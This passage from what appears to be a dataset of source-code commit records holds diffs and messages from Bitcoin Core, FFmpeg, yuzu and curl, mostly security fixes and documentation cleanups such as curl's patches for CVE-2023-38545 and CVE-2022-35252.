    \ on that, but for now requiring all new inputs to be confirmed works.\n     \
    \    //\n@@ -162,15 +162,15 @@ std::optional<std::string> PaysForRBF(CAmount original_fees,\n\
    \                                       CFeeRate relay_fee,\n                \
    \                       const uint256& txid)\n {\n-    // BIP125 Rule #3: The\
    \ replacement fees must be greater than or equal to fees of the\n+    // Rule\
    \ #3: The replacement fees must be greater than or equal to fees of the\n    \
    \ // transactions it replaces, otherwise the bandwidth used by those conflicting\
    \ transactions\n     // would not be paid for.\n     if (replacement_fees < original_fees)\
    \ {\n         return strprintf(\"rejecting replacement %s, less fees than conflicting\
    \ txs; %s < %s\",\n                          txid.ToString(), FormatMoney(replacement_fees),\
    \ FormatMoney(original_fees));\n     }\n \n-    // BIP125 Rule #4: The new transaction\
    \ must pay for its own bandwidth. Otherwise, we have a DoS\n+    // Rule #4: The\
    \ new transaction must pay for its own bandwidth. Otherwise, we have a DoS\n \
    \    // vector where attackers can cause a transaction to be replaced (and relayed)\
    \ repeatedly by\n     // increasing the fee by tiny amounts.\n     CAmount additional_fees\
    \ = replacement_fees - original_fees;"
  - "--- a/src/rpc/mempool.cpp\n+++ b/src/rpc/mempool.cpp\n@@ -690,7 +690,7 @@ static\
    \ RPCHelpMan getmempoolinfo()\n                 {RPCResult::Type::NUM, \"maxmempool\"\
    , \"Maximum memory usage for the mempool\"},\n                 {RPCResult::Type::STR_AMOUNT,\
    \ \"mempoolminfee\", \"Minimum fee rate in \" + CURRENCY_UNIT + \"/kvB for tx\
    \ to be accepted. Is the maximum of minrelaytxfee and minimum mempool fee\"},\n\
    \                 {RPCResult::Type::STR_AMOUNT, \"minrelaytxfee\", \"Current minimum\
    \ relay fee for transactions\"},\n-                {RPCResult::Type::NUM, \"incrementalrelayfee\"\
    , \"minimum fee rate increment for mempool limiting or BIP 125 replacement in\
    \ \" + CURRENCY_UNIT + \"/kvB\"},\n+                {RPCResult::Type::NUM, \"\
    incrementalrelayfee\", \"minimum fee rate increment for mempool limiting or replacement\
    \ in \" + CURRENCY_UNIT + \"/kvB\"},\n                 {RPCResult::Type::NUM,\
    \ \"unbroadcastcount\", \"Current number of transactions that haven't passed initial\
    \ broadcast yet\"},\n                 {RPCResult::Type::BOOL, \"fullrbf\", \"\
    True if the mempool accepts RBF without replaceability signaling inspection\"\
    },\n             }},"
  - "--- a/src/rpc/net.cpp\n+++ b/src/rpc/net.cpp\n@@ -605,7 +605,7 @@ static RPCHelpMan\
    \ getnetworkinfo()\n                             }},\n                       \
    \  }},\n                         {RPCResult::Type::NUM, \"relayfee\", \"minimum\
    \ relay fee rate for transactions in \" + CURRENCY_UNIT + \"/kvB\"},\n-      \
    \                  {RPCResult::Type::NUM, \"incrementalfee\", \"minimum fee rate\
    \ increment for mempool limiting or BIP 125 replacement in \" + CURRENCY_UNIT\
    \ + \"/kvB\"},\n+                        {RPCResult::Type::NUM, \"incrementalfee\"\
    , \"minimum fee rate increment for mempool limiting or replacement in \" + CURRENCY_UNIT\
    \ + \"/kvB\"},\n                         {RPCResult::Type::ARR, \"localaddresses\"\
    , \"list of local addresses\",\n                         {\n                 \
    \            {RPCResult::Type::OBJ, \"\", \"\","
  - "--- a/src/validation.cpp\n+++ b/src/validation.cpp\n@@ -449,7 +449,7 @@ class\
    \ MemPoolAccept\n         /** Whether we allow transactions to replace mempool\
    \ transactions by BIP125 rules. If false,\n          * any transaction spending\
    \ the same inputs as a transaction in the mempool is considered\n          * a\
    \ conflict. */\n-        const bool m_allow_bip125_replacement;\n+        const\
    \ bool m_allow_replacement;\n         /** When true, the mempool will not be trimmed\
    \ when individual transactions are submitted in\n          * Finalize(). Instead,\
    \ limits should be enforced at the end to ensure the package is not\n        \
    \  * partially submitted.\n@@ -469,7 +469,7 @@ class MemPoolAccept\n         \
    \                    /* m_bypass_limits */ bypass_limits,\n                  \
    \           /* m_coins_to_uncache */ coins_to_uncache,\n                     \
    \        /* m_test_accept */ test_accept,\n-                            /* m_allow_bip125_replacement\
    \ */ true,\n+                            /* m_allow_replacement */ true,\n   \
    \                          /* m_package_submission */ false,\n               \
    \              /* m_package_feerates */ false,\n             };\n@@ -483,7 +483,7\
    \ @@ class MemPoolAccept\n                             /* m_bypass_limits */ false,\n\
    \                             /* m_coins_to_uncache */ coins_to_uncache,\n   \
    \                          /* m_test_accept */ true,\n-                      \
    \      /* m_allow_bip125_replacement */ false,\n+                            /*\
    \ m_allow_replacement */ false,\n                             /* m_package_submission\
    \ */ false, // not submitting to mempool\n                             /* m_package_feerates\
    \ */ false,\n             };\n@@ -497,7 +497,7 @@ class MemPoolAccept\n      \
    \                       /* m_bypass_limits */ false,\n                       \
    \      /* m_coins_to_uncache */ coins_to_uncache,\n                          \
    \   /* m_test_accept */ false,\n-                            /* m_allow_bip125_replacement\
    \ */ false,\n+                            /* m_allow_replacement */ false,\n \
    \                            /* m_package_submission */ true,\n              \
    \               /* m_package_feerates */ true,\n             };\n@@ -510,7 +510,7\
    \ @@ class MemPoolAccept\n                             /* m_bypass_limits */ false,\n\
    \                             /* m_coins_to_uncache */ package_args.m_coins_to_uncache,\n\
    \                             /* m_test_accept */ package_args.m_test_accept,\n\
    -                            /* m_allow_bip125_replacement */ true,\n+       \
    \                     /* m_allow_replacement */ true,\n                      \
    \       /* m_package_submission */ false,\n                             /* m_package_feerates\
    \ */ false, // only 1 transaction\n             };\n@@ -524,15 +524,15 @@ class\
    \ MemPoolAccept\n                  bool bypass_limits,\n                  std::vector<COutPoint>&\
    \ coins_to_uncache,\n                  bool test_accept,\n-                 bool\
    \ allow_bip125_replacement,\n+                 bool allow_replacement,\n     \
    \             bool package_submission,\n                  bool package_feerates)\n\
    \             : m_chainparams{chainparams},\n               m_accept_time{accept_time},\n\
    \               m_bypass_limits{bypass_limits},\n               m_coins_to_uncache{coins_to_uncache},\n\
    \               m_test_accept{test_accept},\n-              m_allow_bip125_replacement{allow_bip125_replacement},\n\
    +              m_allow_replacement{allow_replacement},\n               m_package_submission{package_submission},\n\
    \               m_package_feerates{package_feerates}\n         {\n@@ -731,7 +731,7\
    \ @@ bool MemPoolAccept::PreChecks(ATMPArgs& args, Workspace& ws)\n     {\n  \
    \       const CTransaction* ptxConflicting = m_pool.GetConflictTx(txin.prevout);\n\
    \         if (ptxConflicting) {\n-            if (!args.m_allow_bip125_replacement)\
    \ {\n+            if (!args.m_allow_replacement) {\n                 // Transaction\
    \ conflicts with a mempool tx, but we're not allowing replacements.\n        \
    \         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY, \"bip125-replacement-disallowed\"\
    );\n             }\n@@ -861,8 +861,8 @@ bool MemPoolAccept::PreChecks(ATMPArgs&\
    \ args, Workspace& ws)\n         // Specifically, the subset of RBF transactions\
    \ which we allow despite chain limits are those which\n         // conflict directly\
    \ with exactly one other transaction (but may evict children of said transaction),\n\
    \         // and which are not adding any new mempool dependencies. Note that\
    \ the \"no new mempool dependencies\"\n-        // check is accomplished later,\
    \ so we don't bother doing anything about it here, but if BIP 125 is\n-      \
    \  // amended, we may need to move that check to here instead of removing it wholesale.\n\
    +        // check is accomplished later, so we don't bother doing anything about\
    \ it here, but if our\n+        // policy changes, we may need to move that check\
    \ to here instead of removing it wholesale.\n         //\n         // Such transactions\
    \ are clearly not merging any existing packages, so we are only concerned with\n\
    \         // ensuring that (a) no package is growing past the package size (not\
    \ count) limits and (b) we are\n@@ -929,7 +929,7 @@ bool MemPoolAccept::ReplacementChecks(Workspace&\
    \ ws)\n     TxValidationState& state = ws.m_state;\n \n     CFeeRate newFeeRate(ws.m_modified_fees,\
    \ ws.m_vsize);\n-    // The replacement transaction must have a higher feerate\
    \ than its direct conflicts.\n+    // Enforce Rule #6. The replacement transaction\
    \ must have a higher feerate than its direct conflicts.\n     // - The motivation\
    \ for this check is to ensure that the replacement transaction is preferable for\n\
    \     //   block-inclusion, compared to what would be removed from the mempool.\n\
    \     // - This logic predates ancestor feerate-based transaction selection, which\
    \ is why it doesn't\n@@ -942,18 +942,18 @@ bool MemPoolAccept::ReplacementChecks(Workspace&\
    \ ws)\n         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY, \"\
    insufficient fee\", *err_string);\n     }\n \n-    // Calculate all conflicting\
    \ entries and enforce BIP125 Rule #5.\n+    // Calculate all conflicting entries\
    \ and enforce Rule #5.\n     if (const auto err_string{GetEntriesForConflicts(tx,\
    \ m_pool, ws.m_iters_conflicting, ws.m_all_conflicting)}) {\n         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY,\n\
    \                              \"too many potential replacements\", *err_string);\n\
    \     }\n-    // Enforce BIP125 Rule #2.\n+    // Enforce Rule #2.\n     if (const\
    \ auto err_string{HasNoNewUnconfirmed(tx, m_pool, ws.m_iters_conflicting)}) {\n\
    \         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY,\n      \
    \                        \"replacement-adds-unconfirmed\", *err_string);\n   \
    \  }\n     // Check if it's economically rational to mine this transaction rather\
    \ than the ones it\n-    // replaces and pays for its own relay fees. Enforce\
    \ BIP125 Rules #3 and #4.\n+    // replaces and pays for its own relay fees. Enforce\
    \ Rules #3 and #4.\n     for (CTxMemPool::txiter it : ws.m_all_conflicting) {\n\
    \         ws.m_conflicting_fees += it->GetModifiedFee();\n         ws.m_conflicting_size\
    \ += it->GetTxSize();\n@@ -1224,7 +1224,7 @@ PackageMempoolAcceptResult MemPoolAccept::AcceptMultipleTransactions(const\
    \ std::\n         // package to spend. Since we already checked conflicts in the\
    \ package and we don't allow\n         // replacements, we don't need to track\
    \ the coins spent. Note that this logic will need to be\n         // updated if\
    \ package replace-by-fee is allowed in the future.\n-        assert(!args.m_allow_bip125_replacement);\n\
    +        assert(!args.m_allow_replacement);\n         m_viewmempool.PackageAddTransaction(ws.m_ptx);\n\
    \     }\n "
  - "--- a/src/wallet/feebumper.cpp\n+++ b/src/wallet/feebumper.cpp\n@@ -128,8 +128,8\
    \ @@ static CFeeRate EstimateFeeRate(const CWallet& wallet, const CWalletTx& wtx,\
    \ con\n     // WALLET_INCREMENTAL_RELAY_FEE value to future proof against changes\
    \ to\n     // network wide policy for incremental relay fee that our node may\
    \ not be\n     // aware of. This ensures we're over the required relay fee rate\n\
    -    // (BIP 125 rule 4).  The replacement tx will be at least as large as the\n\
    -    // original tx, so the total fee will be greater (BIP 125 rule 3)\n+    //\
    \ (Rule 4).  The replacement tx will be at least as large as the\n+    // original\
    \ tx, so the total fee will be greater (Rule 3)\n     CFeeRate node_incremental_relay_fee\
    \ = wallet.chain().relayIncrementalFee();\n     CFeeRate wallet_incremental_relay_fee\
    \ = CFeeRate(WALLET_INCREMENTAL_RELAY_FEE);\n     feerate += std::max(node_incremental_relay_fee,\
    \ wallet_incremental_relay_fee);"
  - "--- a/src/wallet/rpc/spend.cpp\n+++ b/src/wallet/rpc/spend.cpp\n@@ -224,7 +224,7\
    \ @@ RPCHelpMan sendtoaddress()\n                                          \"\
    transaction, just kept in your wallet.\"},\n                     {\"subtractfeefromamount\"\
    , RPCArg::Type::BOOL, RPCArg::Default{false}, \"The fee will be deducted from\
    \ the amount being sent.\\n\"\n                                          \"The\
    \ recipient will receive less bitcoins than you enter in the amount field.\"},\n\
    -                    {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"\
    wallet default\"}, \"Allow this transaction to be replaced by a transaction with\
    \ higher fees via BIP 125\"},\n+                    {\"replaceable\", RPCArg::Type::BOOL,\
    \ RPCArg::DefaultHint{\"wallet default\"}, \"Signal that this transaction can\
    \ replaced by a transaction (BIP 125)\"},\n                     {\"conf_target\"\
    , RPCArg::Type::NUM, RPCArg::DefaultHint{\"wallet -txconfirmtarget\"}, \"Confirmation\
    \ target in blocks\"},\n                     {\"estimate_mode\", RPCArg::Type::STR,\
    \ RPCArg::Default{\"unset\"}, \"The fee estimate mode, must be one of (case insensitive):\\\
    n\"\n                      \"\\\"\" + FeeModes(\"\\\"\\n\\\"\") + \"\\\"\"},\n\
    @@ -333,7 +333,7 @@ RPCHelpMan sendmany()\n                             {\"address\"\
    , RPCArg::Type::STR, RPCArg::Optional::OMITTED, \"Subtract fee from this address\"\
    },\n                         },\n                     },\n-                  \
    \  {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"wallet default\"\
    }, \"Allow this transaction to be replaced by a transaction with higher fees via\
    \ BIP 125\"},\n+                    {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"\
    wallet default\"}, \"Signal that this transaction can replaced by a transaction\
    \ (BIP 125)\"},\n                     {\"conf_target\", RPCArg::Type::NUM, RPCArg::DefaultHint{\"\
    wallet -txconfirmtarget\"}, \"Confirmation target in blocks\"},\n            \
    \         {\"estimate_mode\", RPCArg::Type::STR, RPCArg::Default{\"unset\"}, \"\
    The fee estimate mode, must be one of (case insensitive):\\n\"\n             \
    \         \"\\\"\" + FeeModes(\"\\\"\\n\\\"\") + \"\\\"\"},"
  commit_message: "Merge bitcoin/bitcoin#25775: docs: remove non-signaling mentions\
    \ of BIP125\n\n1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e [doc] remove non-signaling\
    \ mentions of BIP125 (glozow)\n32024d40f03fbf47c64d814fa5f2c2a73ec14cb7 scripted-diff:\
    \ remove mention of BIP125 from non-signaling var names (glozow)\n\nPull request\
    \ description:\n\n  We have pretty thorough documentation of our RBF policy in\
    \ doc/policy/mempool-replacements.md. It enumerates each rule with several sentences\
    \ of rationale. Also, each rule pretty much has its own function (3 and 4 share\
    \ one), with extensive comments. The doc states explicitly that our rules are\
    \ similar but differ from BIP125, and contains a record of historical changes\
    \ to RBF policy.\n\n  We should not use \"BIP125\" as synonymous with our RBF\
    \ policy because:\n  - Our RBF policy is different from what is specified in BIP125,\
    \ for example:\n      - the BIP does not mention our rule about the replacement\
    \ feerate being higher (our Rule 6)\n      - the BIP uses minimum relay feerate\
    \ for Rule 4, while we have used incremental relay feerate since #9380\n     \
    \ - the \"inherited signaling\" question (CVE-2021-31876). Call it discrepancy,\
    \ ambiguous wording, doc misinterpretation, or implementation details, I would\
    \ recommend users refer to doc/policy/mempool-replacements.md\n      - the signaling\
    \ policy is configurable, see #25353\n  - Our RBF policy may change further\n\
    \  - We have already marked BIP125 as only \"partially implemented\" in docs/bips.md\
    \ since 1fd49eb498c75a1d14193bb736d195a3dc75ae12\n  - See comments from people\
    \ who are not me recently:\n      - https://github.com/bitcoin/bitcoin/pull/25038#discussion_r909507429\n\
    \      - https://github.com/bitcoin/bitcoin/pull/25575#issuecomment-1179519204\n\
    \n  This PR removes all non-signaling mentions of BIP125 (if people feel strongly,\
    \ we can remove all mentions of BIP125 period). It may be useful to refer to the\
    \ concept of \"tx opts in to RBF if it has at least one nSequence less than (0xffffffff\
    \ - 1)\" as \"BIP125 signaling\" because:\n  - It is succint.\n  - It has already\
    \ been widely marketed as BIP125 opt-in signaling.\n  - Our API uses it when referring\
    \ to signaling (e.g. getmempoolentry[\"bip125-replaceable\"] and wallet error\
    \ message \"not BIP 125 replaceable\"). Changing those is more invasive.\n  -\
    \ If/when we have other ways to signal in the future, we can disambiguate them\
    \ this way. See #25038 which proposes another way of signaling, and where I pulled\
    \ these commits from.\n\n  Alternatives:\n  - Changing our policy to match BIP125.\
    \ This doesn't make sense as, for example, we would have to remove the requirement\
    \ that a replacement tx has a higher feerate (Rule 6).\n  - Changing BIP125 to\
    \ match what we have. This doesn't make sense as it would be a significant change\
    \ to a BIP years after it was finalized and already used as a spec to implement\
    \ RBF in other places.\n  - Document our policy as a new BIP and give it a number.\
    \ This might make sense if we don't expect things to change a lot, and can be\
    \ done as a next step.\n\nACKs for top commit:\n  darosior:\n    ACK 1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e\n\
    \  ariard:\n    ACK 1dc03dda\n  t-bast:\n    ACK https://github.com/bitcoin/bitcoin/commit/1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e\n\
    \nTree-SHA512: a3adc2039ec5785892d230ec442e50f47f7062717392728152bbbe27ce1c564141f85253143f53cb44e1331cf47476d74f5d2f4b3cd873fc3433d7a0aa783e02"
  commit_sha: c5f0cbefa369b0e4d99a4f871e6334955d537c1f
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/libavformat/oggparseflac.c\n+++ b/libavformat/oggparseflac.c\n@@ -40,7\
    \ +40,10 @@ flac_header (AVFormatContext * s, int idx)\n     if (os->buf[os->pstart]\
    \ == 0xff)\n         return 0;\n \n-    init_get_bits(&gb, os->buf + os->pstart,\
    \ os->psize*8);\n+    ret = init_get_bits8(&gb, os->buf + os->pstart, os->psize);\n\
    +    if (ret < 0)\n+        return ret;\n+\n     skip_bits1(&gb); /* metadata_last\
    \ */\n     mdt = get_bits(&gb, 7);\n "
  commit_message: 'avformat/oggparseflac: check init_get_bits'' result


    Check init_get_bits'' result for NULL, to avoid dereferencing a NULL

    pointer later (CWE-476).

    Without this, a segfault happens when trying to decode a handcrafted

    ogg-flac file with an absurdly long (e.g. 268435455 bytes) ogg header.


    Co-authored-by: James Almer <jamrial@gmail.com>

    Signed-off-by: Paul Arzelier <paul.arzelier@free.fr>'
  commit_sha: a9042db1d30483639b3ca610b74a7d43f29ea1a9
  repo_name: FFmpeg/FFmpeg
- commit_diff:
  - "--- a/src/core/hle/service/ns/ns.cpp\n+++ b/src/core/hle/service/ns/ns.cpp\n\
    @@ -26,6 +26,7 @@\n #include \"core/hle/service/ns/platform_service_manager.h\"\
    \n #include \"core/hle/service/ns/read_only_application_control_data_interface.h\"\
    \n #include \"core/hle/service/ns/read_only_application_record_interface.h\"\n\
    +#include \"core/hle/service/ns/vulnerability_manager_interface.h\"\n #include\
    \ \"core/hle/service/server_manager.h\"\n #include \"core/hle/service/set/settings_server.h\"\
    \n \n@@ -601,30 +602,6 @@ class NS_SU final : public ServiceFramework<NS_SU> {\n\
    \     }\n };\n \n-class NS_VM final : public ServiceFramework<NS_VM> {\n-public:\n\
    -    explicit NS_VM(Core::System& system_) : ServiceFramework{system_, \"ns:vm\"\
    } {\n-        // clang-format off\n-        static const FunctionInfo functions[]\
    \ = {\n-            {1200, &NS_VM::NeedsUpdateVulnerability, \"NeedsUpdateVulnerability\"\
    },\n-            {1201, nullptr, \"UpdateSafeSystemVersionForDebug\"},\n-    \
    \        {1202, nullptr, \"GetSafeSystemVersion\"},\n-        };\n-        //\
    \ clang-format on\n-\n-        RegisterHandlers(functions);\n-    }\n-\n-private:\n\
    -    void NeedsUpdateVulnerability(HLERequestContext& ctx) {\n-        LOG_WARNING(Service_NS,\
    \ \"(STUBBED) called\");\n-\n-        IPC::ResponseBuilder rb{ctx, 3};\n-    \
    \    rb.Push(ResultSuccess);\n-        rb.Push(false);\n-    }\n-};\n-\n void\
    \ LoopProcess(Core::System& system) {\n     auto server_manager = std::make_unique<ServerManager>(system);\n\
    \ \n@@ -637,7 +614,8 @@ void LoopProcess(Core::System& system) {\n \n     server_manager->RegisterNamedService(\"\
    ns:dev\", std::make_shared<NS_DEV>(system));\n     server_manager->RegisterNamedService(\"\
    ns:su\", std::make_shared<NS_SU>(system));\n-    server_manager->RegisterNamedService(\"\
    ns:vm\", std::make_shared<NS_VM>(system));\n+    server_manager->RegisterNamedService(\"\
    ns:vm\",\n+                                         std::make_shared<IVulnerabilityManagerInterface>(system));\n\
    \     server_manager->RegisterNamedService(\"pdm:qry\", std::make_shared<PDM_QRY>(system));\n\
    \ \n     server_manager->RegisterNamedService(\"pl:s\","
  - '--- a/src/core/hle/service/ns/vulnerability_manager_interface.cpp

    +++ b/src/core/hle/service/ns/vulnerability_manager_interface.cpp

    @@ -0,0 +1,31 @@

    +// SPDX-FileCopyrightText: Copyright 2024 yuzu Emulator Project

    +// SPDX-License-Identifier: GPL-2.0-or-later

    +

    +#include "core/hle/service/cmif_serialization.h"

    +#include "core/hle/service/ns/vulnerability_manager_interface.h"

    +

    +namespace Service::NS {

    +

    +IVulnerabilityManagerInterface::IVulnerabilityManagerInterface(Core::System&
    system_)

    +    : ServiceFramework{system_, "ns:vm"} {

    +    // clang-format off

    +    static const FunctionInfo functions[] = {

    +        {1200, D<&IVulnerabilityManagerInterface::NeedsUpdateVulnerability>,
    "NeedsUpdateVulnerability"},

    +        {1201, nullptr, "UpdateSafeSystemVersionForDebug"},

    +        {1202, nullptr, "GetSafeSystemVersion"},

    +    };

    +    // clang-format on

    +

    +    RegisterHandlers(functions);

    +}

    +

    +IVulnerabilityManagerInterface::~IVulnerabilityManagerInterface() = default;

    +

    +Result IVulnerabilityManagerInterface::NeedsUpdateVulnerability(

    +    Out<bool> out_needs_update_vulnerability) {

    +    LOG_WARNING(Service_NS, "(STUBBED) called");

    +    *out_needs_update_vulnerability = false;

    +    R_SUCCEED();

    +}

    +

    +} // namespace Service::NS'
  commit_message: 'ns: rewrite IVulnerabilityManagerInterface'
  commit_sha: 626f2e65b1a799d3e5c517d480a4691176fbe8d6
  repo_name: yuzu-emu/yuzu
- commit_diff:
  - "--- a/lib/socks.c\n+++ b/lib/socks.c\n@@ -587,9 +587,9 @@ static CURLproxycode\
    \ do_SOCKS5(struct Curl_cfilter *cf,\n \n     /* RFC1928 chapter 5 specifies max\
    \ 255 chars for domain name in packet */\n     if(!socks5_resolve_local && hostname_len\
    \ > 255) {\n-      infof(data, \"SOCKS5: server resolving disabled for hostnames\
    \ of \"\n-            \"length > 255 [actual len=%zu]\", hostname_len);\n-   \
    \   socks5_resolve_local = TRUE;\n+      failf(data, \"SOCKS5: the destination\
    \ hostname is too long to be \"\n+            \"resolved remotely by the proxy.\"\
    );\n+      return CURLPX_LONG_HOSTNAME;\n     }\n \n     if(auth & ~(CURLAUTH_BASIC\
    \ | CURLAUTH_GSSAPI))\n@@ -903,7 +903,7 @@ static CURLproxycode do_SOCKS5(struct\
    \ Curl_cfilter *cf,\n       }\n       else {\n         socksreq[len++] = 3;\n\
    -        socksreq[len++] = (char) hostname_len; /* one byte address length */\n\
    +        socksreq[len++] = (unsigned char) hostname_len; /* one byte length */\n\
    \         memcpy(&socksreq[len], sx->hostname, hostname_len); /* w/o NULL */\n\
    \         len += hostname_len;\n       }"
  commit_message: 'socks: return error if hostname too long for remote resolve


    Prior to this change the state machine attempted to change the remote

    resolve to a local resolve if the hostname was longer than 255

    characters. Unfortunately that did not work as intended and caused a

    security issue.


    Bug: https://curl.se/docs/CVE-2023-38545.html'
  commit_sha: fb4415d8aee6c1045be932a34fe6107c2f5ed147
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/fopen.c\n+++ b/lib/fopen.c\n@@ -106,7 +106,6 @@ CURLcode Curl_fopen(struct\
    \ Curl_easy *data, const char *filename,\n \n   free(tempstore);\n \n-  *tempname\
    \ = NULL;\n   return result;\n }\n "
  commit_message: 'fopen: remove unnecessary assignment


    [CWE-1164] V1048: The ''* tempname'' variable was assigned the same value.


    Ref: https://pvs-studio.com/en/docs/warnings/v1048/


    Closes https://github.com/curl/curl/pull/10398'
  commit_sha: 74040ddecb6e25ae81a2a38acc10950d4529bb8d
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/http.c\n+++ b/lib/http.c\n@@ -2396,8 +2396,7 @@ CURLcode Curl_http_bodysend(struct\
    \ Curl_easy *data, struct connectdata *conn,\n        we don't upload data chunked,\
    \ as RFC2616 forbids us to set both\n        kinds of headers (Transfer-Encoding:\
    \ chunked and Content-Length) */\n     if(http->postsize != -1 && !data->req.upload_chunky\
    \ &&\n-       (conn->bits.authneg ||\n-        !Curl_checkheaders(data, STRCONST(\"\
    Content-Length\")))) {\n+       (!Curl_checkheaders(data, STRCONST(\"Content-Length\"\
    )))) {\n       /* we allow replacing this header if not during auth negotiation,\n\
    \          although it isn't very wise to actually set your own */\n       result\
    \ = Curl_dyn_addf(r,\n@@ -3171,8 +3170,10 @@ CURLcode Curl_http(struct Curl_easy\
    \ *data, bool *done)\n   }\n \n   result = Curl_http_cookies(data, conn, &req);\n\
    +#ifdef USE_WEBSOCKETS\n   if(!result && conn->handler->protocol&(CURLPROTO_WS|CURLPROTO_WSS))\n\
    \     result = Curl_ws_request(data, &req);\n+#endif\n   if(!result)\n     result\
    \ = Curl_add_timecondition(data, &req);\n   if(!result)"
  commit_message: 'http: fix "part of conditional expression is always false"


    [CWE-570] V560: A part of conditional expression is always false: conn->bits.authneg.

    [CWE-570] V560: A part of conditional expression is always false: conn->handler->protocol
    & (0 | 0).


    https://pvs-studio.com/en/docs/warnings/v560/


    Closes #10399'
  commit_sha: e1f78ce25b86bd3a1db2f08918114bb0eae46ecc
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/cookie.c\n+++ b/lib/cookie.c\n@@ -441,6 +441,30 @@ static bool bad_domain(const\
    \ char *domain)\n   return TRUE;\n }\n \n+/*\n+  RFC 6265 section 4.1.1 says a\
    \ server should accept this range:\n+\n+  cookie-octet    = %x21 / %x23-2B / %x2D-3A\
    \ / %x3C-5B / %x5D-7E\n+\n+  But Firefox and Chrome as of June 2022 accept space,\
    \ comma and double-quotes\n+  fine. The prime reason for filtering out control\
    \ bytes is that some HTTP\n+  servers return 400 for requests that contain such.\n\
    +*/\n+static int invalid_octets(const char *p)\n+{\n+  /* Reject all bytes \\\
    x01 - \\x1f (*except* \\x09, TAB) + \\x7f */\n+  static const char badoctets[]\
    \ = {\n+    \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\"\n+    \"\\x0b\\\
    x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\"\n+    \"\\x15\\x16\\x17\\x18\\x19\\\
    x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x7f\"\n+  };\n+  size_t vlen, len;\n+  /* scan for\
    \ all the octets that are *not* in cookie-octet */\n+  len = strcspn(p, badoctets);\n\
    +  vlen = strlen(p);\n+  return (len != vlen);\n+}\n+\n /*\n  * Curl_cookie_add\n\
    \  *\n@@ -595,6 +619,11 @@ Curl_cookie_add(struct Curl_easy *data,\n         \
    \    badcookie = TRUE;\n             break;\n           }\n+          if(invalid_octets(whatptr)\
    \ || invalid_octets(name)) {\n+            infof(data, \"invalid octets in name/value,\
    \ cookie dropped\");\n+            badcookie = TRUE;\n+            break;\n+ \
    \         }\n         }\n         else if(!len) {\n           /*"
  commit_message: 'cookie: reject cookies with "control bytes"


    Rejects 0x01 - 0x1f (except 0x09) plus 0x7f


    Reported-by: Axel Chong


    Bug: https://curl.se/docs/CVE-2022-35252.html


    CVE-2022-35252


    Closes #9381'
  commit_sha: 8dfc93e573ca740544a2d79ebb0ed786592c65c3
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/connect.c\n+++ b/lib/connect.c\n@@ -1667,20 +1667,6 @@ CURLcode Curl_socket(struct\
    \ Curl_easy *data,\n   }\n #endif\n \n-#if defined(__linux__) && defined(IP_RECVERR)\n\
    -  if(addr->socktype == SOCK_DGRAM) {\n-    int one = 1;\n-    switch(addr->family)\
    \ {\n-    case AF_INET:\n-      (void)setsockopt(*sockfd, SOL_IP, IP_RECVERR,\
    \ &one, sizeof(one));\n-      break;\n-    case AF_INET6:\n-      (void)setsockopt(*sockfd,\
    \ SOL_IPV6, IPV6_RECVERR, &one, sizeof(one));\n-      break;\n-    }\n-  }\n-#endif\n\
    -\n   return CURLE_OK;\n }\n "
  commit_message: 'connect: revert the use of IP*_RECVERR


    The options were added in #6341 and d13179d, but cause problems: Lots of

    POLLIN event occurs but recvfrom read nothing.


    Reported-by: Tatsuhiro Tsujikawa

    Fixes #9209

    Closes #9215'
  commit_sha: 3141062c2338138eded3a91892e5bde20a5365cd
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/cookie.c\n+++ b/lib/cookie.c\n@@ -99,8 +99,8 @@ Example set of cookies:\n\
    \ #include \"curl_get_line.h\"\n #include \"curl_memrchr.h\"\n #include \"parsedate.h\"\
    \n-#include \"rand.h\"\n #include \"rename.h\"\n+#include \"fopen.h\"\n \n /*\
    \ The last 3 #include files should be in this order */\n #include \"curl_printf.h\"\
    \n@@ -1641,20 +1641,9 @@ static CURLcode cookie_output(struct Curl_easy *data,\n\
    \     use_stdout = TRUE;\n   }\n   else {\n-    unsigned char randsuffix[9];\n\
    -\n-    if(Curl_rand_hex(data, randsuffix, sizeof(randsuffix)))\n-      return\
    \ 2;\n-\n-    tempstore = aprintf(\"%s.%s.tmp\", filename, randsuffix);\n-   \
    \ if(!tempstore)\n-      return CURLE_OUT_OF_MEMORY;\n-\n-    out = fopen(tempstore,\
    \ FOPEN_WRITETEXT);\n-    if(!out) {\n-      error = CURLE_WRITE_ERROR;\n+   \
    \ error = Curl_fopen(data, filename, &out, &tempstore);\n+    if(error)\n    \
    \   goto error;\n-    }\n   }\n \n   fputs(\"# Netscape HTTP Cookie File\\n\"\n\
    @@ -1701,7 +1690,7 @@ static CURLcode cookie_output(struct Curl_easy *data,\n\
    \   if(!use_stdout) {\n     fclose(out);\n     out = NULL;\n-    if(Curl_rename(tempstore,\
    \ filename)) {\n+    if(tempstore && Curl_rename(tempstore, filename)) {\n   \
    \    unlink(tempstore);\n       error = CURLE_WRITE_ERROR;\n       goto error;"
  - '--- a/lib/fopen.c

    +++ b/lib/fopen.c

    @@ -0,0 +1,113 @@

    +/***************************************************************************

    + *                                  _   _ ____  _

    + *  Project                     ___| | | |  _ \| |

    + *                             / __| | | | |_) | |

    + *                            | (__| |_| |  _ <| |___

    + *                             \___|\___/|_| \_\_____|

    + *

    + * Copyright (C) 1998 - 2022, Daniel Stenberg, <daniel@haxx.se>, et al.

    + *

    + * This software is licensed as described in the file COPYING, which

    + * you should have received as part of this distribution. The terms

    + * are also available at https://curl.se/docs/copyright.html.

    + *

    + * You may opt to use, copy, modify, merge, publish, distribute and/or sell

